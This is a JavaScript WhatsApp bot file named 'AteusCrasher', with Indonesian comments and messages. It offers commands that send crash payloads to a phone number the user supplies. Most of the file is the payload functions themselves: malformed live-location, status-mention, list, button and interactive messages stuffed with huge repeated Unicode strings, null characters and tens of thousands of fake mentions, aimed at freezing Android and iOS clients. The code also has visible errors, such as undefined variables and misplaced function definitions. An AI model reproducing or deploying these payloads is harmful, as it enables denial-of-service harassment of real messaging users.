const settings = require('./settings');

async function handleMessage(conn, m) {
  if (!m.message) return;

  const body = m.message.conversation 
            || m.message.extendedTextMessage?.text 
            || m.message.imageMessage?.caption 
            || '';

  // Cek prefix
  const prefix = settings.prefix.find(p => body.startsWith(p));
  if (!prefix) return;
  const isValidNumber = (q) => /^\d{9,15}$/.test(q)
  const formatJid = (q) => q.replace(/\D/g, '') + '@s.whatsapp.net'
  const args = body.trim().slice(prefix.length).split(/\s+/);
  const command = args.shift().toLowerCase();
//======END======//

//=====COMMAND====//

switch(command) {
case "allmenu": {
  const Text = `
Haii Saya Adalah *AteusCrasher Via WhatsApp* Yang Di Rakit Oleh ${ownerName} Saya Di Buat Agar Bisa Membantu Anda

* BUG MENU 🥶*
 • lokcrash 628xxx
 • invisbug 628xxx
 • ateuscrasher 628xxx
 • androv5 628xxxx
 • protocolbug7 628xxx
 • ateusdisini 628xxx
 • protocolbug4 628xxx
 • yaakenafc 628xxxx    

* IOS CRASH 🥶*
 • crashiphone 628xxx
 • crashios 628xxx
 
     TQ TO 
ALWAYSHANZZ : DEVELOPER
ALWAYSABELL : SUPPORT SISTEM 
DILZZ CRASHER : KAWAN KU
ALL PENGGUNA SCRIPT INI 
    
   JANGAN LUPA MASUK KE CH GUA
      BIAR GAK KETINGGALAN UPDATE
       TERBARU DARI ATEUSCRASHER 
    https://whatsapp.com/channel/0029Vb5ahlD2v1ImfMMaMr00
  `;
await conn.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break

case 'lockcrash': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}lockcrash 6281234567890`)
  await lockcrash(formatJid(q), m)
  reply(`✅ Bug lockcrash berhasil dikirim ke ${q}`)
}
break

case 'androv5': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}androv5 6281234567890`)
  try {
    await androv5(formatJid(q))
    reply(`✅ Bug Androv5 berhasil dikirim ke ${q}`)
  } catch (err) {
    console.error(err)
    reply('❌ Gagal mengirim bug. Mungkin format target salah atau terjadi error.')
  }
}
break

case 'invisbug': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}invisbug 6281234567890`)
  try {
    await invisbug(conn, formatJid(q), true)
    reply(`✅ Bug invisbug berhasil dikirim ke ${q}`)
  } catch (err) {
    console.error(err)
    reply('❌ Gagal mengirim invisbug.')
  }
}
break

case 'yaakenafc': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}yaakenafc 6281234567890`)
  try {
    await yaakenafc(formatJid(q), true)
    reply(`✅ Bug yaakenafc berhasil dikirim ke ${q}`)
  } catch (err) {
    console.error(err)
    reply('❌ Gagal mengirim bug yaakenafc.')
  }
}
break

case 'crashios': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}crashios 6281234567890`)
  try {
    await crashios(conn, formatJid(q))
    reply(`✅ Crash iOS berhasil dikirim ke ${q}`)
  } catch (err) {
    console.error(err)
    reply('❌ Gagal mengirim Crash iOS.')
  }
}
break

case 'ateuscrasher': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}ateuscrasher 6281234567890`)
  try {
    await ateuscrasher(conn, formatJid(q))
    reply(`✅ AteusCrasher berhasil dikirim ke ${q}`)
  } catch (err) {
    console.error(err)
    reply('❌ Gagal mengirim AteusCrasher.')
  }
}
break

case 'protocolbug4': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}protocolbug4 6281234567890`)
  try {
    await protocolbug4(conn, formatJid(q), true)
    reply(`✅ protocolbug4 terkirim ke ${q}`)
  } catch (e) {
    console.error(e)
    reply('❌ Gagal mengirim protocolbug4.')
  }
}
break

case 'crashiphone': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}crashiphone 6281234567890`)
  try {
    await CrashiPhone(conn, formatJid(q))
    reply(`✅ CrashiPhone terkirim ke ${q}`)
  } catch (e) {
    console.error(e)
    reply('❌ Gagal mengirim CrashiPhone.')
  }
}
break

case 'ateusdisini': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}ateusdisini 6281234567890`)
  try {
    await ateusdisini(conn, formatJid(q))
    reply(`✅ Crash live location berhasil dikirim ke ${q}`)
  } catch (err) {
    console.error(err)
    reply(`❌ Gagal kirim crash: ${err.message}`)
  }
}
break

case 'protocolbug7': {
  if (!isValidNumber(q)) return reply(`Contoh: ${prefix}protocolbug7 6281234567890`)
  try {
    await protocolbug7(conn, formatJid(q), true)
    reply(`✅ protocolbug7 berhasil dikirim ke ${q}`)
  } catch (e) {
    console.error(e)
    reply('❌ Gagal mengirim protocolbug7.')
  }
}
break

//=======Function Bugs======//
async function lockcrash(target, wanted) {

var etc = generateWAMessageFromContent(target, proto.Message.fromObject({

viewOnceMessage: {

message: {

  "liveLocationMessage": {

    "degreesLatitude": "p",

    "degreesLongitude": "p",

    "caption": `*\`҈AteusCrasher.Com᭢\`*`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: wanted })

await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
    console.log(chalk.yellow.bold("ateuscrasher"));
}

async function invisbug(conn, target, mention) { const generateMessage = { viewOnceMessage: { message: { audioMessage: { url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true", mimetype: "audio/mpeg", fileSha256: Buffer.from([ 226, 213, 217, 102, 205, 126, 232, 145, 0,  70, 137,  73, 190, 145,   0,  44, 165, 102, 153, 233, 111, 114,  69,  10, 55,  61, 186, 131, 245, 153,  93, 211 ]), fileLength: 432722, seconds: 26, ptt: false, mediaKey: Buffer.from([ 182, 141, 235, 167, 91, 254,  75, 254, 190, 229,  25,  16, 78,  48,  98, 117, 42,  71,  65, 199, 10, 164,  16,  57, 189, 229,  54,  93, 69,   6, 212, 145 ]), fileEncSha256: Buffer.from([ 29,  27, 247, 158, 114,  50, 140,  73, 40, 108,  77, 206,   2,  12,  84, 131, 54,  42,  63,  11,  46, 208, 136, 131, 224,  87,  18, 220, 254, 211,  83, 153 ]), directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0", mediaKeyTimestamp: 1746275400, contextInfo: { mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"), isSampled: true, participant: target, remoteJid: "status@broadcast", forwardingScore: 9741, isForwarded: true } } } } };

const msg = generateWAMessageFromContent(target, generateMessage, {});

await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
        {
            tag: "meta",
            attrs: {},
            content: [
                {
                    tag: "mentioned_users",
                    attrs: {},
                    content: [
                        {
                            tag: "to",
                            attrs: { jid: target },
                            content: undefined
                        }
                    ]
                }
            ]
        }
    ]
});

if (mention) {
    await conn.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "X" },
                    content: undefined
                }
            ]
        }
    );
}

}

async function crashiphone(conm, target) {
conn.relayMessage(
target,
{
  extendedTextMessage: {
    text: `𝚒𝚘𝚜 𝚢𝚊 𝚋𝚊𝚗𝚐` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "𝚍𝚛𝚎𝚊𝚍𝚘𝚜𝚝𝚎𝚡 ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function ateusdisini(conn, target) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        liveLocationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          caption:
            "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆" +
            "饝噦饝喌饝喆饝喛".repeat(10000),
          sequenceNumber: "0",
          jpegThumbnail: Buffer.alloc(0), // kosongkan buffer untuk thumbnail
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}    

async function ateuscrasher(conn, target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "鈳�" + "釤勧煗".repeat(10000),
      caption: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆" + "釤勧煗".repeat(10000),
      jpegThumbnail: null
    }
  };
  await conn.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function protocolbug4(conn, target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "岘�".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "\u0000" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "\u0000"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await conn.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await conn.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "\u0000" },
content: undefined
}
]
}
);
}
}

async function CrashIOS(conn, target) {
                   try {
                           const IphoneCrash = "饝噦饝喌饝喆饝喛".repeat(60000);
                           await hanzz.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆          " + IphoneCrash,
                                           url: "t.me/alwayshanzz"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
           }

async function yaakenafc(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝚢𝚊𝚑𝚊𝚑𝚊 𝚗𝚐𝚎𝚕𝚊𝚐",
                    footerText: "𝙾𝚗𝚎 𝙲𝚕𝚒𝚌𝚔 𝙲𝚛𝚊𝚜𝚑 𝚒𝚜 𝚋𝚊𝚌𝚔 ༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await conn.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "⟅̊༑ ▾𝚖𝚊𝚔𝚕𝚞⟅̊༑ ▾ " },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function protocolbug7(conn, target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 700000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await conn.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

 async function androv5(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "☠️ 𐌃𐌀𐌋𐌂𐌔𐌔 ა𐌵ק𐌄𐌃 Ꮭ𐌃𐌀𐌔Ⴙ ☠️\n" + "ꦽ".repeat(90999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            virtexId: conn.generateMessageTag(),
            participant: target,
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "109951162777600",
                  pageCount: 9999999999,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "\u0000".repeat(999),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: { url : "https://files.catbox.moe/ykvioj.jpg" },
                },
                hasMediaAttachment: true,
                contentText: '☠️ 𐌃𐌀𐌋𐌂𐌔𐌔 ა𐌵ק𐌄𐌃 Ꮭ𐌃𐌀𐌔Ⴙ ☠️\n' +  "ꦽ".repeat(69999),
                footerText: " ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(9999),
                    buttonText: {
                      displayText: "ꦽ".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(9999),
                    buttonText: {
                      displayText: "ꦽ".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(9999),
                    buttonText: {
                      displayText: "ꦽ".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: target,
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/alwayshanzz",
              buttonTitle: "\u0000".repeat(9117),
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "1@newsletter",
              serverMessageId: 1,
              newsletterName: `${"نꥈ".repeat(100)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "ꦽ".repeat(19999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 99; i++) {
    let largeText = "☠️ 𐌃𐌀𐌋𐌂𐌔𐌔 ა𐌵ק𐌄𐌃 Ꮭ𐌃𐌀𐌔Ⴙ ☠️\n" + "ꦽ".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(99999),
          subrows: [
            {
              title: `\u0000`.repeat(99999),
              id: `\u0000`.repeat(99999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(99999),
                  id: `\u0000`.repeat(99999),
                },
                {
                  title: `\u0000`.repeat(99999),
                  id: `\u0000`.repeat(99999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(99999),
              id: `\u0000`.repeat(99999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "☠️ 𐌃𐌀𐌋𐌂𐌔𐌔 ა𐌵ק𐌄𐌃 Ꮭ𐌃𐌀𐌔Ⴙ ☠️\n" + "ꦽ".repeat(69999),
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [ target, ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net` )],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "☠️ 𐌃𐌀𐌋𐌂𐌔𐌔 ა𐌵ק𐌄𐌃 Ꮭ𐌃𐌀𐌔Ⴙ ☠️\n" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(`SUCCESSFULLY`);
  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await conn.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(`SUCCESSFULLY`);
}

default:
      return await conn.sendMessage(m.key.remoteJid, { text: 'Command tidak dikenal.' }, { quoted: m });
  }
}

module.exports = handleMessage;
